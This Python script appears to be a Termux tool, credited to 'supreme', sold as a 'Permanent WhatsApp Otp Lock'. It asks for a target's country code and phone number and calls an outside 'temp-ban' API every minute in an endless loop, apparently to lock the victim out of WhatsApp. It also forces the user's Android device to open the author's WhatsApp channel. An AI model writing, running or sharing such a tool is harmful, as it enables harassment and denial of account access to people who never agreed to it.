import requests
import subprocess
import time
import os
from rich.console import Console
from rich.panel import Panel


os.system("clear")
def otp_lock_banner():
    console = Console()

    # Animated colorful text effect
    colors = ["red", "yellow", "green", "cyan", "blue", "magenta"]
    for color in colors:
        console.clear()
        panel = Panel(f'''
[bold {color}]●[bold {colors[(colors.index(color) + 1) % len(colors)]}] ●[bold {colors[(colors.index(color) + 2) % len(colors)]}] ●

░█▀▀▀█ █──█ █▀▀█ █▀▀█ █▀▀ █▀▄▀█ █▀▀ 
─▀▀▀▄▄ █──█ █──█ █▄▄▀ █▀▀ █─▀─█ █▀▀ 
░█▄▄▄█ ─▀▀▀ █▀▀▀ ▀─▀▀ ▀▀▀ ▀───▀ ▀▀▀
[bold {color}]●[bold {colors[(colors.index(color) + 1) % len(colors)]}] ●[bold {colors[(colors.index(color) + 2) % len(colors)]}] ======================================================
[bold white][[bold red]^[bold white]] [bold green] Author: supreme \n[bold white][[bold red]^[bold white]] [bold green] Github: github.com/flashanish \n[bold white][[bold red]^[bold white]] [bold green] Whatsapp: https://whatsapp.com/channel/0029VaAWr3x5PO0y7qLfcR26
[bold {color}] [bold {colors[(colors.index(color) + 1) % len(colors)]}] [bold {colors[(colors.index(color) + 2) % len(colors)]}]===================================================== ''', title="[bold red] Created By supreme", style=color)
        console.print(panel)
        time.sleep(0.5)

# API function
def temp_ban_api(country_code, phone_number):
    try:
        api_url = f"https://api-bruxiintk.online/api/temp-ban?apikey=bx&ddi={country_code}&numero={phone_number}"
        response = requests.get(api_url)
        response.raise_for_status()  # Raise an exception for HTTP errors
        if response.status_code == 200:
            return "\n\n[✓] Successfully done\n  Completed..!!\n\nThank You For Using My Script!!\n Created By supreme!!\n"
        else:
            return "Not done"
    except requests.exceptions.RequestException as e:
        return f"Error: {e}"
        
def main():
    otp_lock_banner()
    country_code = input("\n\033[90m[\033[91m?\033[90m]] \033[92m[X]Enter Your Country Code (e.g., +91): " '\n └─> ')
    if not country_code.startswith("+"):
        country_code = "+" + country_code
    
    phone_number = input("\n\033[90m[\033[91m?\033[90m]] \033[92m[?]Enter Your Mobile Number: " '\n └─> ')
    phone_number = phone_number.replace(" ", "")  # Remove spaces
    
    while True:
        result = temp_ban_api(country_code, phone_number)
        print(result)
        time.sleep(60)  # Delay for 1 minute

# Function to print text with delay, bold, and color
def print_with_delay_and_color(text, color_code, bold=True, delay_char=0.03):
    bold_code = "1;" if bold else ""  # Set bold code if bold is True
    for char in text:
        print(f"\033[{bold_code}{color_code}m{char}", end='', flush=True)
        time.sleep(delay_char)
    print("\033[0m", end='', flush=True)

# Function to print a line separator
def print_separator():
    print("\033[1;30m==============================\033[0m")

# Define lines of text with color and bold settings
lines = [
    ("CALL ME supreme..", "93", True),
    ("I AM FROM Nepal..", "92", True),
    ("I AM THE OWNER OF SUPREME TEAM..", "94", True),
    ("HOPE YOU LIKE THIS SCRIPT..", "95", True),
    ("OOPS... I TALK A LOT SRY FOR THAT..", "96", True),
    ("Whatsapp Channel: ", "97", True),
    ("https://whatsapp.com/channel/0029VaAWr3x5PO0y7qLfcR26", "91", False),
    ("Permanent WhatsApp Otp Lock..", "92", True),
    ("Wait For Start Tool..............", "90", True)
]

# Print each line with specified color, bold, and delay
for line, color_code, bold in lines:
    print_with_delay_and_color(line, color_code, bold)
    print()
    time.sleep(0.5)  # Add delay between lines

# Wait for 6 seconds
time.sleep(6.0)

# Function to redirect users to a whatsapp channel
def redirect_to_whatsapp_channel(channel_url):
    """
    Redirects the user to a Whatsapp channel using the provided URL.
    
    Args:
        channel_url (str): The URL of the whatsapp channel.
    """
    try:
        subprocess.run(["am", "start", "-a", "android.intent.action.VIEW", "-d", channel_url], check=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
    except subprocess.CalledProcessError as e:
        print(f"Error: {e}")

# URL of your whatsapp channel
whatsapp_channel_url = "https://whatsapp.com/channel/0029VaAWr3x5PO0y7qLfcR26"

# Redirect users to the whatsapp channel
redirect_to_whatsapp_channel(whatsapp_channel_url)

if __name__ == "__main__":
    main()
